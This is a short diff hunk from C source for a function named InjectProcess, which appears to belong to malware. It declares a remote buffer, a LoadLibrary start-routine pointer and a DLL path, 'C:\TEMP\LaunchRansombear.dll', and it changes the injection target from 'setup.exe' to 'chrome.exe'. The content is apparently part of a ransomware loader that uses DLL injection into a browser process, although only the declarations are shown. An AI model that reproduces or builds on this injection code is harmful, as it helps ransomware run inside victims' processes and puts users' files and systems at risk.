@@ -62,7 +62,7 @@ int InjectProcess() {
     PVOID remBuf;
     PTHREAD_START_ROUTINE pLoadLibrary = NULL;
     char dll[] = "C:\\TEMP\\LaunchRansombear.dll";
-    char target[] = "setup.exe";
+    char target[] = "chrome.exe";
     int pid = 0;
 
 
